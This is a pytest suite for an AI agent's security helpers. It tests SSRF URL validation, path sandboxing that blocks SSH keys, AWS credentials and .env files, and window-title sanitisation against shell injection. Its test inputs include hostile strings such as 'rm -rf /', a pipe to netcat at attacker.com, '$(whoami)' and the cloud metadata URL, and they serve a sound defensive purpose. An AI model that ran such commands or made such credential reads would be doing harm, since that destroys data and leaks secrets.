"""Tests for the shared security utilities module."""

import os
import pytest


class TestValidateUrl:
    """SSRF protection tests."""

    def test_import(self):
        from solstice_agent.tools.security import validate_url
        assert callable(validate_url)

    def test_allows_https(self):
        from solstice_agent.tools.security import validate_url
        assert validate_url("https://api.example.com/v1") is None

    def test_allows_http(self):
        from solstice_agent.tools.security import validate_url
        assert validate_url("http://example.com") is None

    def test_blocks_file_scheme(self):
        from solstice_agent.tools.security import validate_url
        result = validate_url("file:///etc/passwd")
        assert result is not None
        assert "not allowed" in result

    def test_blocks_javascript_scheme(self):
        from solstice_agent.tools.security import validate_url
        result = validate_url("javascript:alert(1)")
        assert result is not None

    def test_blocks_aws_metadata(self):
        from solstice_agent.tools.security import validate_url
        result = validate_url("http://169.254.169.254/latest/meta-data/")
        assert result is not None
        assert "metadata" in result.lower() or "blocked" in result.lower()

    def test_blocks_localhost(self):
        from solstice_agent.tools.security import validate_url
        result = validate_url("http://localhost:6379/")
        assert result is not None

    def test_blocks_127001(self):
        from solstice_agent.tools.security import validate_url
        result = validate_url("http://127.0.0.1:9200/")
        assert result is not None

    def test_blocks_private_10x(self):
        from solstice_agent.tools.security import validate_url
        result = validate_url("http://10.0.0.1/admin")
        assert result is not None

    def test_blocks_private_192168(self):
        from solstice_agent.tools.security import validate_url
        result = validate_url("http://192.168.1.1/")
        assert result is not None

    def test_allows_private_when_flag_set(self):
        from solstice_agent.tools.security import validate_url
        result = validate_url("http://192.168.1.1/", allow_private=True)
        assert result is None

    def test_blocks_empty_hostname(self):
        from solstice_agent.tools.security import validate_url
        result = validate_url("http:///path")
        assert result is not None

    def test_blocks_dangerous_ports(self):
        from solstice_agent.tools.security import validate_url
        for port in [6379, 11211, 27017, 5432, 3306]:
            result = validate_url(f"http://external.com:{port}/")
            assert result is not None, f"Port {port} should be blocked"


class TestValidatePath:
    """Path sandboxing tests."""

    def test_import(self):
        from solstice_agent.tools.security import validate_path
        assert callable(validate_path)

    def test_blocks_ssh_keys(self):
        from solstice_agent.tools.security import validate_path
        result = validate_path(os.path.expanduser("~/.ssh/id_rsa"), "read")
        assert result is not None
        assert "sensitive" in result.lower()

    def test_blocks_aws_credentials(self):
        from solstice_agent.tools.security import validate_path
        result = validate_path(os.path.expanduser("~/.aws/credentials"), "read")
        assert result is not None

    def test_blocks_env_file(self):
        from solstice_agent.tools.security import validate_path
        result = validate_path("/app/.env", "read")
        assert result is not None

    def test_blocks_docker_config(self):
        from solstice_agent.tools.security import validate_path
        result = validate_path(os.path.expanduser("~/.docker/config.json"), "read")
        assert result is not None

    def test_workspace_boundary(self):
        from solstice_agent.tools.security import validate_path, set_workspace_root
        # Set workspace to a specific dir
        original_root = None
        try:
            from solstice_agent.tools.security import _workspace_root
            original_root = _workspace_root
        except ImportError:
            pass

        set_workspace_root(os.path.dirname(__file__))

        # Path within workspace — OK
        result = validate_path(__file__, "read")
        assert result is None, f"Should allow path within workspace, got: {result}"

        # Path outside workspace — blocked
        result = validate_path("/etc/passwd", "read")
        assert result is not None
        assert "outside" in result.lower()

        # Reset
        if original_root is not None:
            set_workspace_root(original_root)
        else:
            import solstice_agent.tools.security as sec
            sec._workspace_root = None

    def test_allows_when_no_workspace_set(self):
        from solstice_agent.tools.security import validate_path
        import solstice_agent.tools.security as sec
        old = sec._workspace_root
        sec._workspace_root = None
        try:
            # Non-sensitive path with no workspace set — allowed
            result = validate_path("/tmp/test.txt", "read")
            assert result is None
        finally:
            sec._workspace_root = old


class TestSanitizeTitle:
    """screen_capture_window title sanitization tests."""

    def test_import(self):
        from solstice_agent.tools.screen import _sanitize_title
        assert callable(_sanitize_title)

    def test_allows_normal_title(self):
        from solstice_agent.tools.screen import _sanitize_title
        assert _sanitize_title("Visual Studio Code") == "Visual Studio Code"

    def test_allows_title_with_numbers(self):
        from solstice_agent.tools.screen import _sanitize_title
        assert _sanitize_title("Chrome - Tab 3") == "Chrome - Tab 3"

    def test_blocks_backtick(self):
        from solstice_agent.tools.screen import _sanitize_title
        with pytest.raises(ValueError):
            _sanitize_title("`whoami`")

    def test_blocks_semicolon(self):
        from solstice_agent.tools.screen import _sanitize_title
        with pytest.raises(ValueError):
            _sanitize_title("test; rm -rf /")

    def test_blocks_pipe(self):
        from solstice_agent.tools.screen import _sanitize_title
        with pytest.raises(ValueError):
            _sanitize_title("test | nc attacker.com")

    def test_blocks_dollar(self):
        from solstice_agent.tools.screen import _sanitize_title
        with pytest.raises(ValueError):
            _sanitize_title("$(whoami)")

    def test_blocks_empty(self):
        from solstice_agent.tools.screen import _sanitize_title
        with pytest.raises(ValueError):
            _sanitize_title("")

    def test_blocks_too_long(self):
        from solstice_agent.tools.screen import _sanitize_title
        with pytest.raises(ValueError):
            _sanitize_title("A" * 201)
